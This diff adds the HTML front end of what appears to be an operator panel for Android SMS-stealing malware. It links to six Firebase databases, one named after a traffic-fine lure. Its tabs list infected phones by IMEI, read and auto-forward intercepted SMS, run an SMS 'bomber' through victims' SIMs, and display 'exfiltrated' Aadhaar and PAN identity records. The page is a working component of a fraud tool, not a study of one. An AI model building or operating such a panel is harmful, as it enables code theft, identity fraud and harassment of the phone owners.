@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="theme-color" content="#030708">
+    <title>CYBER C2 TERMINAL // ZERO-DAY COMMAND MATRIX</title>
+    <meta name="description" content="Tactical Mobile Exploitation Command Deck & Encrypted Telemetry Grid">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700;800&family=Orbitron:wght@600;700;800;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body data-planet="money">
+    <!-- Master Cyberpunk Terminal Security Lock Overlay -->
+    <div class="cyber-lock-overlay" id="cyberLockOverlay">
+        <div class="cyber-lock-card" id="cyberLockCard">
+            <div class="cyber-lock-corner corner-tl"></div>
+            <div class="cyber-lock-corner corner-tr"></div>
+            <div class="cyber-lock-corner corner-bl"></div>
+            <div class="cyber-lock-corner corner-br"></div>
+            <div class="cyber-lock-scanline"></div>
+
+            <div class="cyber-lock-header">
+                <div class="cyber-lock-shield">
+                    <svg width="42" height="42" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                    </svg>
+                </div>
+                <div class="lock-badge-tag">RESTRICTED ZERO-DAY SYSTEM</div>
+                <h1 class="lock-title">SYSTEM LOCKDOWN</h1>
+                <p class="lock-subtitle">// CLASSIFIED C2 GATEWAY ACCESS // IDENTIFY OPERATOR</p>
+            </div>
+
+            <div class="lock-terminal-box">
+                <div class="lock-terminal-bar">
+                    <span class="terminal-dot red"></span>
+                    <span class="terminal-dot yellow"></span>
+                    <span class="terminal-dot green"></span>
+                    <span class="terminal-title">AUTH_GATEWAY.SYS // PORT 0x443</span>
+                </div>
+                <div class="lock-prompt-row">
+                    <span class="lock-prompt-prefix">root@c2:~#</span>
+                    <span class="lock-prompt-text">challenge-auth --require-token</span>
+                </div>
+                <div class="lock-input-group">
+                    <div class="lock-input-wrap">
+                        <span class="lock-input-icon">🔑</span>
+                        <input type="password" id="cyberLockInput" class="lock-input" placeholder="ENTER ACCESS PASSWORD" autocomplete="off" spellcheck="false" autofocus>
+                        <button type="button" class="lock-eye-btn" id="lockEyeBtn" onclick="toggleLockPasswordVisibility()" title="Toggle Cipher">👁️</button>
+                    </div>
+                    <div class="lock-error-msg" id="cyberLockError"></div>
+                </div>
+            </div>
+
+            <button class="lock-submit-btn" id="cyberLockSubmit" onclick="verifyLockPassword()">
+                <span class="btn-glitch-text">AUTHENTICATE CIPHER ⚡</span>
+                <span class="btn-subtext">[ PRESS ENTER OR TOUCH ]</span>
+            </button>
+
+            <div class="lock-meta-footer">
+                <div class="lock-meta-item">
+                    <span class="meta-label">SECURITY PROTOCOL:</span>
+                    <span class="meta-val">AES-GCM-256</span>
+                </div>
+                <div class="lock-meta-item">
+                    <span class="meta-label">GATEWAY:</span>
+                    <span class="meta-val">ACTIVE NODE ENCRYPTION</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Matrix Digital Rain Canvas -->
+    <canvas id="matrixCanvas"></canvas>
+
+    <!-- Ambient Grid & Top Scanning Laser -->
+    <div class="ambient-bg"></div>
+    <div class="cosmic-orbit-bar"></div>
+
+    <!-- Server Gateway Selector Modal (Hidden until operator unlocks password) -->
+    <div class="server-modal hidden" id="serverModal">
+        <div class="server-modal-content">
+            <div class="server-modal-header">
+                <div class="planet-badge-icon">
+                    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <rect x="2" y="3" width="20" height="14" rx="2" ry="2"/>
+                        <line x1="8" y1="21" x2="16" y2="21"/>
+                        <line x1="12" y1="17" x2="12" y2="21"/>
+                        <line x1="6" y1="8" x2="6.01" y2="8"/>
+                        <line x1="10" y1="8" x2="10.01" y2="8"/>
+                        <line x1="14" y1="8" x2="14.01" y2="8"/>
+                    </svg>
+                </div>
+                <h2>ROOT GATEWAY DISPATCH ☠️</h2>
+                <p>[ SELECT ENCRYPTED C2 HUB FREQUENCY ]</p>
+            </div>
+            <div class="server-list">
+                <button class="server-btn" onclick="selectServer('https://red-panel-shamsul-2-default-rtdb.firebaseio.com', 'money')">
+                    <div class="server-icon icon-blue">
+                        <span>💵</span>
+                    </div>
+                    <div class="server-info">
+                        <span class="server-name">SERVER MONEY 💵</span>
+                        <span class="server-sub">0x01 // red-panel-shamsul-2 RTDB</span>
+                    </div>
+                    <div class="server-arrow">›</div>
+                </button>
+
+                <button class="server-btn" onclick="selectServer('https://bosssssssssssss2-f7e29-default-rtdb.firebaseio.com', 'mega')">
+                    <div class="server-icon icon-cyan">
+                        <span>⚡</span>
+                    </div>
+                    <div class="server-info">
+                        <span class="server-name">SERVER MEGA ⚡</span>
+                        <span class="server-sub">0x02 // bosssssssssssss2-f7e29 RTDB</span>
+                    </div>
+                    <div class="server-arrow">›</div>
+                </button>
+
+                <button class="server-btn" onclick="selectServer('https://k-party-admin-panel-default-rtdb.firebaseio.com', 'paisa')">
+                    <div class="server-icon icon-gold">
+                        <span>👑</span>
+                    </div>
+                    <div class="server-info">
+                        <span class="server-name">SERVER PAISA 👑</span>
+                        <span class="server-sub">0x03 // k-party-admin-panel RTDB</span>
+                    </div>
+                    <div class="server-arrow">›</div>
+                </button>
+
+                <button class="server-btn" onclick="selectServer('https://mishra-d9db2-default-rtdb.firebaseio.com', 'rupee')">
+                    <div class="server-icon icon-red">
+                        <span>🔴</span>
+                    </div>
+                    <div class="server-info">
+                        <span class="server-name">SERVER RUPEE 🔴</span>
+                        <span class="server-sub">0x04 // mishra-d9db2 RTDB</span>
+                    </div>
+                    <div class="server-arrow">›</div>
+                </button>
+
+                <button class="server-btn" onclick="selectServer('https://rto-challan-2cd79-default-rtdb.firebaseio.com', 'dollar')">
+                    <div class="server-icon icon-emerald">
+                        <span>💲</span>
+                    </div>
+                    <div class="server-info">
+                        <span class="server-name">SERVER DOLLAR 💲</span>
+                        <span class="server-sub">0x05 // rto-challan-2cd79 RTDB</span>
+                    </div>
+                    <div class="server-arrow">›</div>
+                </button>
+
+                <button class="server-btn" onclick="selectServer('https://hhhg-b94a2-default-rtdb.firebaseio.com', 'euro')">
+                    <div class="server-icon icon-indigo">
+                        <span>💶</span>
+                    </div>
+                    <div class="server-info">
+                        <span class="server-name">SERVER EURO 💶</span>
+                        <span class="server-sub">0x06 // hhhg-b94a2 RTDB</span>
+                    </div>
+                    <div class="server-arrow">›</div>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Top Tactical Status Bar -->
+    <div class="status-bar">
+        <div class="status-bar-left">
+            <span class="status-dot" id="statusDot"></span>
+            <span class="status-text" id="statusText">LINK // ARMED</span>
+        </div>
+        <div class="status-bar-center">
+            <span class="orbit-status-tag">[ ROOT@C2: ENCRYPTED ]</span>
+        </div>
+        <div class="status-bar-right" id="headerTime">00:00</div>
+    </div>
+
+    <!-- App Header -->
+    <header class="app-header">
+        <div class="header-logo" onclick="openServerModal()" title="Switch Gateway">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                <polygon points="12 2 2 7 12 12 22 7 12 2"></polygon>
+                <polyline points="2 17 12 22 22 17"></polyline>
+                <polyline points="2 12 12 17 22 12"></polyline>
+            </svg>
+        </div>
+        <div class="header-info">
+            <h1 id="headerServerName">SERVER MONEY 💵</h1>
+            <p>ROOT@TERMINAL // 0x01 // RED-PANEL SHAMSUL-2 RTDB</p>
+        </div>
+        <div class="header-actions">
+            <!-- Audio FX Toggle Button -->
+            <button class="sfx-toggle-btn active" id="sfxToggleBtn" onclick="toggleAudioFx()" title="Cyber Sound FX">
+                <span id="sfxIcon">🔊</span>
+                <span>SFX</span>
+            </button>
+            <!-- System Lockdown Quick Button -->
+            <button class="lock-btn" id="quickLockBtn" onclick="lockWebsite()" title="Lockdown Terminal">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                </svg>
+            </button>
+            <button class="logout-btn" onclick="logout()" title="Disengage Gateway">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                    <path d="M18.36 6.64a9 9 0 1 1-12.73 0"></path>
+                    <line x1="12" y1="2" x2="12" y2="12"></line>
+                </svg>
+            </button>
+        </div>
+    </header>
+
+    <!-- REPOSITIONED TAB CONTROLS: TOP TACTICAL CYBER DECK SWITCHER -->
+    <nav class="top-tactical-deck" id="topTacticalDeck">
+        <button class="tactical-tab-btn active" data-tab="sender" onclick="switchTab('sender')">
+            <span class="tab-code">[ 01 ]</span>
+            <span class="tab-label">TARGETS</span>
+            <div class="tab-glow-indicator"></div>
+        </button>
+        <button class="tactical-tab-btn" data-tab="logs" onclick="switchTab('logs')">
+            <span class="tab-code">[ 02 ]</span>
+            <span class="tab-label">INTERCEPTS</span>
+            <div class="tab-glow-indicator"></div>
+        </button>
+        <button class="tactical-tab-btn" data-tab="bomber" onclick="switchTab('bomber')">
+            <span class="tab-code">[ 03 ]</span>
+            <span class="tab-label">INJECTOR</span>
+            <div class="tab-glow-indicator"></div>
+        </button>
+        <button class="tactical-tab-btn" data-tab="pages" onclick="switchTab('pages')">
+            <span class="tab-code">[ 04 ]</span>
+            <span class="tab-label">DOSSIER</span>
+            <div class="tab-glow-indicator"></div>
+        </button>
+    </nav>
+
+    <!-- Mobile Scrollable Main Content -->
+    <main class="main-content" id="mainContent">
+
+        <!-- ===== TAB 1: CYBER TARGETS / PROBES ===== -->
+        <section class="tab-panel active" id="panelSender">
+            <!-- Stats Row -->
+            <div class="stats-row">
+                <div class="stat-chip stat-suspects">
+                    <span class="stat-value" id="deviceCountVal">0</span>
+                    <span class="stat-label">TOTAL NODES</span>
+                </div>
+                <div class="stat-chip stat-green">
+                    <span class="stat-value" id="onlineCountVal">0</span>
+                    <span class="stat-label">LIVE BREACH</span>
+                </div>
+                <div class="stat-chip stat-red">
+                    <span class="stat-value" id="mutedCountVal">0</span>
+                    <span class="stat-label">DARK SECTOR</span>
+                </div>
+            </div>
+
+            <!-- Terminal Search Query -->
+            <div class="search-bar">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
+                    <circle cx="11" cy="11" r="8" />
+                    <line x1="21" y1="21" x2="16.65" y2="16.65" />
+                </svg>
+                <input type="text" id="deviceSearch" placeholder="root@query: node_id, imei, model…" autocomplete="off">
+            </div>
+
+            <!-- Filter Pills -->
+            <div class="filter-row">
+                <button class="pill active" data-filter="all" onclick="setDeviceFilter('all')">[ ALL NODES ]</button>
+                <button class="pill" data-filter="active" onclick="setDeviceFilter('active')">[ ONLINE ]</button>
+                <button class="pill" data-filter="muted" onclick="setDeviceFilter('muted')">[ DARK SECTOR ]</button>
+            </div>
+
+            <!-- Tactical Action Matrix (2x2 Grid) -->
+            <div class="action-row">
+                <button class="action-btn action-primary" onclick="fetchDevices()" id="fetchDevicesBtn">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                        <polyline points="23 4 23 10 17 10" />
+                        <path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10" />
+                    </svg>
+                    SWEEP ACTIVE NODES ⚡
+                </button>
+                <button class="action-btn" onclick="selectAllDevices()">[ 🎯 LOCK ALL ]</button>
+                <button class="action-btn" onclick="unmuteSelected()">[ 📡 RESTORE LINK ]</button>
+                <button class="action-btn action-red" style="grid-column: span 2;" onclick="toggleMuteSelected()">
+                    [ 🌑 SECTOR SILENCE / TOGGLE MUTE ]
+                </button>
+            </div>
+
+            <!-- Device List Container -->
+            <div class="device-list" id="deviceList">
+                <div class="empty-state" id="deviceEmpty">
+                    <div class="empty-planet-icon">⚡</div>
+                    <p>NO ACTIVE NODES IN RADAR</p>
+                    <span>Tap "SWEEP ACTIVE NODES" to initiate frequency recon</span>
+                </div>
+            </div>
+
+            <!-- Device Pagination -->
+            <div class="pagination" id="devicePagination" style="display:none;">
+                <button class="page-btn" id="devicePrevBtn" onclick="prevDevicePage()" disabled>‹</button>
+                <span class="page-info" id="devicePageInfo">1 / 1</span>
+                <button class="page-btn" id="deviceNextBtn" onclick="nextDevicePage()" disabled>›</button>
+            </div>
+        </section>
+
+        <!-- ===== TAB 2: INTERCEPTED TRANSCRIPTS / SMS LOGS ===== -->
+        <section class="tab-panel" id="panelLogs">
+            <div class="section-header-row">
+                <h2>DECRYPTED TELEMETRY STREAM 📡</h2>
+                <span class="badge" id="smsCountBadge">0</span>
+            </div>
+
+            <div class="action-row" style="margin-bottom: 12px;">
+                <button class="action-btn action-primary" onclick="fetchAllSms()" id="fetchSmsBtn">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
+                        <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z" />
+                    </svg>
+                    DECRYPT LIVE FEED STREAM ⚡
+                </button>
+            </div>
+
+            <!-- SMS List Container -->
+            <div class="sms-list" id="smsList">
+                <div class="empty-state" id="smsEmpty">
+                    <div class="empty-planet-icon">📡</div>
+                    <p>NO INTERCEPTS CAPTURED</p>
+                    <span>Execute "DECRYPT LIVE FEED" to capture payload transmissions</span>
+                </div>
+            </div>
+
+            <!-- Pagination -->
+            <div class="pagination" id="smsPagination" style="display:none;">
+                <button class="page-btn" id="smsPrevBtn" onclick="prevSmsPage()" disabled>‹</button>
+                <span class="page-info" id="smsPageInfo">1 / 1</span>
+                <button class="page-btn" id="smsNextBtn" onclick="nextSmsPage()" disabled>›</button>
+            </div>
+        </section>
+
+        <!-- ===== TAB 3: PACKET INJECTOR / SMS BARRAGE ===== -->
+        <section class="tab-panel" id="panelBomber">
+            <!-- Bomber Hero -->
+            <div class="bomber-hero">
+                <div class="bomber-icon">
+                    <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                        <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon>
+                    </svg>
+                </div>
+                <h2>TACTICAL PACKET INJECTOR ⚡</h2>
+                <p>HIGH-VELOCITY MULTI-CARRIER PAYLOAD DISPATCH</p>
+            </div>
+
+            <!-- Live Counters -->
+            <div class="bomber-stats">
+                <div class="stat-chip stat-green">
+                    <span class="stat-value" id="bomberSentCount">0</span>
+                    <span class="stat-label">INJECTED</span>
+                </div>
+                <div class="stat-chip stat-red">
+                    <span class="stat-value" id="bomberFailCount">0</span>
+                    <span class="stat-label">DROPPED</span>
+                </div>
+                <div class="stat-chip">
+                    <span class="stat-value" id="bomberTotalCount">0</span>
+                    <span class="stat-label">TOTAL ROUNDS</span>
+                </div>
+            </div>
+
+            <!-- Mode Selector -->
+            <div class="mode-toggle">
+                <button class="mode-btn active" data-mode="bomber" onclick="setBomberMode('bomber')">SWARM BARRAGE</button>
+                <button class="mode-btn" data-mode="normal" onclick="setBomberMode('normal')">DIRECT CONDUIT</button>
+            </div>
+
+            <!-- Injector Form -->
+            <div class="form-card">
+                <label class="form-label">TARGET INFILTRATION NUMBER</label>
+                <input type="tel" id="bomberTarget" class="mobile-input" placeholder="+91XXXXXXXXXX / +1XXXXXXXXXX">
+
+                <label class="form-label">BROADCAST PAYLOAD / MESSAGE</label>
+                <textarea id="bomberMessage" class="mobile-textarea" rows="3" placeholder="Enter weaponized payload text or test ping…"></textarea>
+
+                <!-- Normal Mode Settings -->
+                <div id="normalSettings" style="display:none;">
+                    <label class="form-label">CONDUIT RELAY NODE</label>
+                    <select id="normalSenderSelect" class="mobile-select">
+                        <option value="">— SELECT CONDUIT NODE —</option>
+                    </select>
+                </div>
+
+                <!-- Bomber Mode Settings -->
+                <div id="bomberSettings">
+                    <label class="form-label">TRANSMISSION ROUNDS</label>
+                    <div class="stepper-row">
+                        <button class="stepper-btn" onclick="adjustBomberCount(-10)">−10</button>
+                        <button class="stepper-btn" onclick="adjustBomberCount(-1)">−</button>
+                        <input type="number" id="bomberCount" class="stepper-input" value="50" min="1" max="10000">
+                        <button class="stepper-btn" onclick="adjustBomberCount(1)">+</button>
+                        <button class="stepper-btn" onclick="adjustBomberCount(10)">+10</button>
+                    </div>
+
+                    <!-- Quick Preset Count Buttons -->
+                    <div class="preset-counts-row">
+                        <button class="preset-chip" onclick="setPresetBomberCount(25)">25</button>
+                        <button class="preset-chip" onclick="setPresetBomberCount(50)">50</button>
+                        <button class="preset-chip" onclick="setPresetBomberCount(100)">100</button>
+                        <button class="preset-chip" onclick="setPresetBomberCount(250)">250</button>
+                        <button class="preset-chip" onclick="setPresetBomberCount(500)">500</button>
+                    </div>
+
+                    <label class="form-label">PULSE DELAY (MS)</label>
+                    <div class="stepper-row">
+                        <button class="stepper-btn" onclick="adjustBomberDelay(-100)">−100</button>
+                        <button class="stepper-btn" onclick="adjustBomberDelay(-10)">−</button>
+                        <input type="number" id="bomberDelay" class="stepper-input" value="200" min="0" max="10000">
+                        <button class="stepper-btn" onclick="adjustBomberDelay(10)">+</button>
+                        <button class="stepper-btn" onclick="adjustBomberDelay(100)">+100</button>
+                    </div>
+
+                    <label class="form-label">ACTIVE SWARM CLUSTER</label>
+                    <div class="bomber-device-info">
+                        <span id="bomberDeviceInfo">0 nodes ready</span>
+                        <span class="bomber-hint">Automated round-robin distribution across all connected nodes</span>
+                    </div>
+                </div>
+
+                <label class="form-label">RADIO CARRIER SIM SLOT</label>
+                <div class="sim-toggle">
+                    <button class="sim-btn active" data-slot="1" onclick="selectBomberSim(1)">RADIO SIM 1 ⚡</button>
+                    <button class="sim-btn" data-slot="2" onclick="selectBomberSim(2)">RADIO SIM 2 🚀</button>
+                </div>
+
+                <!-- Progress Bar -->
+                <div class="progress-section" id="bomberProgress" style="display:none;">
+                    <div class="progress-info">
+                        <span id="bomberProgressText">0 / 0</span>
+                        <span id="bomberProgressPercent">0%</span>
+                    </div>
+                    <div class="progress-track">
+                        <div class="progress-fill" id="bomberProgressFill"></div>
+                    </div>
+                </div>
+
+                <!-- Launch / Abort Triggers -->
+                <button class="launch-btn" id="bomberLaunchBtn" onclick="startBomber()">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                        <polygon points="5 3 19 12 5 21 5 3" />
+                    </svg>
+                    INITIATE EXPLOIT BARRAGE ☠️
+                </button>
+
+                <button class="stop-btn" id="bomberStopBtn" onclick="stopBomber()" style="display:none;">
+                    ABORT INJECTION OVERRIDE 🛑
+                </button>
+            </div>
+
+            <!-- Live Injection Feed -->
+            <div class="section-divider">
+                <span>LIVE TRANSMISSION TELEMETRY</span>
+            </div>
+            <div class="bomber-log" id="bomberLog">
+                <div class="empty-state" id="bomberLogEmpty" style="padding:18px;">
+                    <p style="font-size:0.75rem;">CONDUIT CHANNEL IDLE</p>
+                    <span style="font-size:0.62rem;">Launch broadcast to monitor real-time packet stream</span>
+                </div>
+            </div>
+        </section>
+
+        <!-- ===== TAB 4: EXFILTRATED DOSSIERS & IDENTITY ===== -->
+        <section class="tab-panel" id="panelPages">
+            <div class="section-header-row">
+                <h2 id="dossierTitle">EXFILTRATED IDENTITY ARCHIVES 🪪</h2>
+                <button class="action-btn action-primary" onclick="fetchPagesData()"
+                    style="padding:6px 12px; font-size:0.72rem; min-height:34px; grid-column:auto;">SCAN ARCHIVES 📖</button>
+            </div>
+            <p id="dossierSubtitle" style="font-size: 0.75rem; color: var(--text-2); margin-bottom: 12px; font-family: var(--cyber-font-mono);">
+                [ DECRYPTED AADHAAR, PAN & RESIDENT CITIZEN INTEL ]
+            </p>
+
+            <div id="pagesList" class="pages-list" style="display:flex; flex-direction:column; gap:10px;">
+                <div class="empty-state" id="pagesEmpty">
+                    <div class="empty-planet-icon">🗂️</div>
+                    <p>NO DOSSIERS EXTRACTED</p>
+                    <span>Tap "SCAN ARCHIVES" to decrypt database records</span>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- REPOSITIONED BOTTOM NAV: ERGONOMIC MOBILE THUMB DOCK -->
+    <nav class="bottom-nav" id="bottomNav">
+        <button class="nav-item active" data-tab="sender" onclick="switchTab('sender')">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
+                <rect x="2" y="2" width="20" height="8" rx="2" ry="2"/>
+                <rect x="2" y="14" width="20" height="8" rx="2" ry="2"/>
+                <line x1="6" y1="6" x2="6.01" y2="6"/>
+                <line x1="6" y1="18" x2="6.01" y2="18"/>
+            </svg>
+            <span>NODES</span>
+        </button>
+
+        <button class="nav-item" data-tab="logs" onclick="switchTab('logs')">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
+                <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z" />
+            </svg>
+            <span>LOGS</span>
+        </button>
+
+        <!-- Center Glowing Tactical Quick Trigger -->
+        <button class="quick-dock-action" onclick="quickActionTrigger()" title="Quick Tactical Action">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round">
+                <polyline points="23 4 23 10 17 10" />
+                <path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10" />
+            </svg>
+        </button>
+
+        <button class="nav-item" data-tab="bomber" onclick="switchTab('bomber')">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
+                <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon>
+            </svg>
+            <span>INJECT</span>
+        </button>
+
+        <button class="nav-item" data-tab="pages" onclick="switchTab('pages')">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
+                <rect x="3" y="4" width="18" height="16" rx="2" />
+                <circle cx="9" cy="10" r="2" />
+                <line x1="15" y1="8" x2="17" y2="8" />
+                <line x1="15" y1="12" x2="17" y2="12" />
+                <line x1="7" y1="16" x2="17" y2="16" />
+            </svg>
+            <span>DOSSIER</span>
+        </button>
+    </nav>
+
+    <!-- Device Infiltration Terminal Sheet -->
+    <div class="sheet-overlay" id="deviceSheet">
+        <div class="sheet-container" id="sheetContainer">
+            <div class="sheet-handle"></div>
+
+            <div class="sheet-header">
+                <h2 id="sheetTitle">NODE INFILTRATION TERMINAL</h2>
+                <button class="sheet-close" onclick="closeSheet()">DISMISS [✕]</button>
+            </div>
+            <div class="sheet-device-id" id="sheetDeviceId"></div>
+            <div class="sheet-info" id="sheetInfo">Interrogating node telemetry…</div>
+            
+            <div class="sheet-row" style="margin-bottom: 12px; margin-top: 6px;">
+                <button class="action-btn action-primary" style="width:100%; min-height:40px;" onclick="fetchDeviceMoreDetails()">
+                    DEEP FORENSIC SCAN 🔍
+                </button>
+            </div>
+            <div id="sheetMoreDetails"
+                style="display:none; margin-bottom: 12px; padding: 10px; background: rgba(0,0,0,0.5); border-radius: 6px; border: 1px solid var(--orbit-border);">
+            </div>
+
+            <!-- Single SMS Injection -->
+            <div class="sheet-section">
+                <h3>DIRECT COMMAND DISPATCH 📨</h3>
+                <input type="tel" id="sheetPhone" class="mobile-input" placeholder="Destination phone number" style="margin-bottom:8px;">
+                <input type="text" id="sheetMessage" class="mobile-input" placeholder="Payload command string" style="margin-bottom:8px;">
+                <div class="sheet-row">
+                    <div class="sim-toggle sim-sm" style="flex:1">
+                        <button class="sim-btn active" data-slot="1" onclick="selectSheetSim(1)">SIM 1 ⚡</button>
+                        <button class="sim-btn" data-slot="2" onclick="selectSheetSim(2)">SIM 2 🚀</button>
+                    </div>
+                    <button class="action-btn action-primary" style="flex:1; min-height:38px;" onclick="sendSingleMessage()">TRANSMIT ✨</button>
+                </div>
+            </div>
+
+            <!-- Auto Forward Relay -->
+            <div class="sheet-section">
+                <h3>QUANTUM CONDUIT RELAY 🔗</h3>
+                <input type="tel" id="sheetFwdPhone" class="mobile-input" placeholder="Forward destination phone" style="margin-bottom:8px;">
+                <select id="sheetSenderDevice" class="mobile-select" style="margin-bottom:8px;">
+                    <option value="">Select Conduit Vessel</option>
+                </select>
+                <div class="sheet-row">
+                    <button class="action-btn action-primary" id="sheetFwdBtn" onclick="toggleForward()"
+                        style="flex:1; min-height:38px;">START CONDUIT</button>
+                </div>
+                <div class="fwd-status" id="sheetFwdStatus"></div>
+            </div>
+
+            <!-- Device Captured SMS -->
+            <div class="sheet-section">
+                <div class="section-header-row" style="margin-bottom:8px;">
+                    <h3>CAPTURED INTERCEPTS 📜</h3>
+                    <div style="display:flex; gap:6px; align-items:center;">
+                        <button class="action-btn action-primary" style="padding:4px 8px; font-size:0.65rem; min-height:28px;"
+                            onclick="refreshSheetSms()">REFRESH</button>
+                        <span class="badge" id="sheetSmsCount">0</span>
+                    </div>
+                </div>
+                <div class="sheet-sms-list" id="sheetSmsList"></div>
+                <div class="pagination" id="sheetPagination" style="display:none; margin-top:8px;">
+                    <button class="page-btn" id="sheetSmsPrev" onclick="sheetPrevPage()" disabled>‹</button>
+                    <span class="page-info" id="sheetPageInfo">1 / 1</span>
+                    <button class="page-btn" id="sheetSmsNext" onclick="sheetNextPage()" disabled>›</button>
+                </div>
+                <!-- Inline Detail -->
+                <div class="detail-card detail-card-inline" id="sheetSmsDetail" style="display:none; margin-top:8px;">
+                    <div class="detail-card-body" id="sheetSmsDetailBody" style="padding:8px; background:rgba(0,0,0,0.6); border:1px solid var(--orbit-border); border-radius:4px; font-family:var(--cyber-font-mono); font-size:0.75rem; color:#ffffff;"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Notification Toaster -->
+    <div class="toast-container" id="toastContainer"></div>
+
+    <script src="app.js"></script>
+</body>
+
+</html>
